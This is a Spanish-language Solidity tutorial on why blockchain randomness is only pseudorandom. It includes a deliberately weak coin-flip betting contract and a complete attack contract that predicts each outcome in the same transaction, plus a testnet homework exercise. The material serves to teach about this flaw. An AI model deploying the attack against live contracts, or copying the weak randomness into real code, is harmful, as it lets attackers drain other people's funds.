# DEVELANDO NÚMEROS RANDOM EN SOLIDITY

**Author: Lee Marreros**

## Objetivos

* Conocer que en Solidity solo existen números pseudorandom
* Comprender que las variables globales son las mismas en una transacción
* Explicar el vector de ataque en cuanto a la generación de números random

## Random vs pseudorandom

### Determinismo

En Solidity, las funciones tienen una naturaleza determinística. Es decir dados los mismos inputs se producen los mismos outputs. Sin embargo, ello no ayuda a la generación de números random. Por su propia definición, un método generación de números aleatorios debería entregar uno diferente cada vez que es llamado, además de incluir alta entropía en cada iteración. No existe nada parecido en Solidity ya que las fuentes de entropía disponibles en el Blockchain son débiles y predecibles. Incluso algunos actores (e.g. validadores) pueden observar o influenciar las supuestas fuentes de entropía que se usan para generar aleatoriedad (e.g. el validador pone la estampa de tiempo al bloque y puede dilatar el incluir una transacción un bloque posterior).

### Librerías

Las librerías de generación de números random tienen la capacidad de usar diferentes fuentes de entropía. Por ejemplo la librería `crypto` es muy usada con fines criptográficos. Sus fuentes de entropía incluyen eventos de hardware (movimientos de mouse, teclas presionadas, etc.) e incluso hardware cuyo único propósito es generar entropía. Esta entropía es usada como input en el Generador Pseudorandom de Números Asegurados Criptográficamente o CSPRNG (siglas en inglés). Esta función es capaz de generar secuencias de bytes que son indistingibles de verdaderos números aleatorios. Incluso aunque sea posible encontrar alta entropía en Solidity, implementar un modelo de CSPRNG en Solidity sería súmamente costoso en términos de computación.

## Generación de un número pseudorandom

La generación de un número pseudorandom en un contrato inteligente, por lo general involucra combinar variables globales y los siguientes métodos provistos por Solidity: `keccak256` y `abi.encode`/`abi.encodePacked`.

* `keccak256` es un método de hasheo común usando en Ethereum
* `abi.encode` / `abi.encodePacked`: codifican información en un formato que pueda ser entendido por la EVM

Con `abi.encode`/`abi.encodePacked` puedes mezclar múltiples valores para obtener en uno solo. Dicho resultado se toma como input de la función hash `keccak256`. Finalmente, el hash se castea a un valor entero con el constructor  `uint256(hash)`.

Veamos el siguiente contrato:

En `BasicRandomNumber.sol` se han usado las siguientes variables globales: `msg.sender`, `block.timestamp`, `blockhash` y `block.number`:

* `msg.sender` captura el address de quien llama el contrato inteligente
* `blockhash(uint256)` representa el hash de un bloque pasado (max. 256)
* `block.timestamp` es el segundo en el que se hace el llamado de consulta

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

// BasicRandomNumber.sol
contract BasicRandomNumber {
    uint256 public randomNumber;

    function requestRandomWords() external {
        randomNumber = uint256(
            keccak256(
                abi.encodePacked(
                    msg.sender,
                    blockhash(block.number - 1),
                    block.timestamp
                )
            )
        );
    }
}
```

Al llamar `requestRandomWords` lograremos obtener un número pseudorandom. A través del tiempo este valor irá cambiando dado que `block.timestamp`, `blockhash` y `block.number`, sus insumos, también cambian con el tiempo.

Lo más importante a notar es que estas mismas variables globales serán compartidas por cualquier otro método que sea llamado en la misma transacción. Esto justamente abre la puerta para develar a los números random.

## Hackeando números pseudorandom

### El contrato Moneda

Vamos a jugar a tirar la moneda en un contrato inteligente. Para poder jugar debes apostar 1 Ether y además incluir tu predicción (cara o sello). Si logras acertar, el contrato te pagará 2 Ether. Internamente, en cada partida, existe una función de números "aleatorios" que hace el cálculo de la moneda. El objetivo para hackear este contrato está en predecir de manera inequívoca el resultado.

Veamos el contrato `Moneda.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

// Moneda.sol
contract Moneda {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() payable {}

    /// @param _guess es un boolean que debe ser true o false
    function flip(bool _guess) public payable {
        require(msg.value == 1 ether, "Not enough Ether");

        uint256 randomNumber = uint256(
            keccak256(
                abi.encodePacked(
                    msg.sender,
                    blockhash(block.number - 1),
                    block.timestamp
                )
            )
        );

        /**
         * coinFlip puede tener solo dos valores: 0 o 1
         * Si randomNumber es mayor a FACTOR, coinFlip = 1
         * Si randomNumber es menor a FACTOR, coinFlip = 0
         */
        uint256 coinFlip = randomNumber / FACTOR;
        bool guess = coinFlip == 1 ? true : false;

        if (_guess == guess) {
            // Ganaste
            payable(msg.sender).transfer(2 ether);
        }
    }
}
```

1. El método `flip` es el punto de partida para poder jugar cara o sello en este contrato. Se require depositar `1 Ether` para poder participar.
2. La variable `randomNumber` se calcula como lo conversado anteriormente. Cabe notar que el único dato que se recoge del usuario es su  `address` y todo lo demás se lee del blockchain.
3. La variable `coinFlip` se calcula mediante la división de `randomNumber` por `FACTOR`. Dado que  `FACTOR` es muy grande solo obtenemos 0 o 1 como resultado. Ello porque Solidity solo acepta división de enteros (e.g. 3/5 = 0 y 4/3 = 1).
4. Si `coinFlip` es 1, `guess` será `true`, `false` en otro escenario.
5. El resultado de  `guess` se compara con el input y predicción del usuario (`_guess`). Si son iguales, el participante gana `2 Ether`

### El contrato Attack

Vamos a aplicar ingeniería inversa para poder adivinar `guess` del contrato `Moneda.sol`. La manera en que se puede lograr es que podamos usar las mismas variables globales que usó `Moneda.sol` en el cálculo de su número pseudorandom. Al replicar dichos valores, podemos también replicar las operaciones que se llevaron a cabo sobre esos valores. Así podemos "adivinar" `guess` del contrato `Moneda.sol`.

Dado que necesitamos lógica para poder leer y utilizar dichas variables globales, no tenemos otra opción que utilizar otro contrato inteligente para ese objetivo. Por lo general, los ataques a contratos inteligentes se hacen desde otros contratos.

Analicemos el siguiente contrato `HackerMoneda.sol`:

```solidity
interface IMoneda {
    function flip(bool _guess) external payable;
}

contract HackerMoneda {
    IMoneda coinFlipSC;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipAddress) payable {
        coinFlipSC = IMoneda(_coinFlipAddress);
    }

    /**
     * 'attack' y 'flip' son dos funciones que se ejecutan en la misma transacción
     * Es por ello que ambos métodos comparten algunas variables globales
     * En este caso, el hacker llama 'flip' dentro de 'attack' para aprovecharse de ello
     * El atacante es capaz de realizar el mismo cálculo de 'coinFlip' que el contrato original
     * Así logra adivinar el resultado y ganar la apuesta repetidas veces
     */
    function attack() public {
        uint256 randomNumber = uint256(
            keccak256(
                abi.encodePacked(
                    address(this),
                    blockhash(block.number - 1),
                    block.timestamp
                )
            )
        );
        uint256 coinFlip = randomNumber / FACTOR;
        bool _guess = coinFlip == 1 ? true : false;

        coinFlipSC.flip{value: 1 ether}(_guess);
    }

    receive() external payable {}
}
```

1. Definimos la interface `IMoneda` que define el método `flip`. Con esta interface lograremos una comunicación intercontrato. Creamos una referencia al contrato `Moneda.sol` desde el constructor del contrato `HackerMoneda.sol` usando la interface `IMoneda`. Ahora podemos llamar al contrato `Moneda.sol` desde la variable `coinFlipSC`.
2. El método `attack()` ha replicado el cálculo de `randomNumber` haciendo uso de las mismas variables globales. Una sutil diferencia radica en `address(this)` en el método `attack()` vs `msg.sender` en el método `flip()`. Usamos `address(this)` porque en este caso será el contrato `HackerMoneda.sol` el que llamará a `Moneda.sol`. Es decir, el `msg.sender` en `flip()` tiene el mismo valor que `address(this)` en `attack()`.
3. Antes de terminar el método `attack()`, obtenemos el valor de `_guess`. Este valor es usado para llamar al método `flip()` de `Moneda.sol`. Dado que `_guess` fue calculado usando las mismas operaciones que en `flip()`, este valor siempre será el correcto.
4. Para recalcar. El método `attack()`  del contrato `HackerMoneda.sol` y `flip()` del contrato `Moneda.sol` son llamados en la misma transacción (e incluidos en el mismo bloque). Por lo tanto, ambos métodos comparten las mismas variables globales, lo cual permite el ataque.

## Tarea

Realizar esta tarea y guardar la información solicitada en este mismo README.md en tu local:

1. Vas a publicar el contrato `Moneda.sol` en la red Mumbai con las siguientes consideraciones:
   * El contrato `Moneda.sol` debe ser publicado con `2000 wei` o `2000` si lo harás desde Remix
   * En el método `flip`, cambia la validación en el `require` de `msg.value == 1 ether` a `msg.value == 1000`.
   * Hacia el final del método `flip`, cambia el premio de `...transfer(2 ether)` a `...transfer(2000)`.
2. Vas a publicar el contrato `HackerMoneda.sol` en la red Mumbai con las siguientes consideraciones:
   * En vez de enviar `1 ether`, solo envía `1000` al contrato `Moneda.sol` cuando se hace el llamado al método `flip()` desde el método `attack()`.
3. Ejecuta el método `attack()` del contrato `HackerMoneda.sol`. La operación debe ser exitosa y el contrato `HackerMoneda.sol` debería tener ahora un balance de `2000`
4. Copiar aquí el address del contrato  `Moneda.sol` en Mumbai:
5. Copiar aquí el address del contrato  `HackerMoneda.sol` de Mumbai: